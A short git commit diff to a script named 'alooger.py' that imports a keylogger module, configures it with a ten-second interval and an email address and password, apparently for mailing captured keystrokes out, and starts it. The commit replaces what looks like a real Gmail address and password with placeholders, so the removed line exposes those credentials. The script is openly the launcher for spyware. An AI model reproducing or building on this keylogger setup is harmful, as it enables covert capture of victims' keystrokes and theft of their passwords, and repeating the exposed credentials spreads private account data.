bf52d1b7dbb06fab6e7c2c553e343cffb5b88d94
adhamhas <56196111+adhamhas@users.noreply.github.com>
2021-07-28 17:50:07 +0300

    Update alooger.py

--- alooger.py
+++ alooger.py
@@ -1,4 +1,4 @@
 import keylogger
 
-my_keylogger = keylogger.Keylogger(10, "noob1234noob.99@gmail.com ", "noob1234noob")
+my_keylogger = keylogger.Keylogger(10, "temp mail  ", "pass ")
 my_keylogger.start()
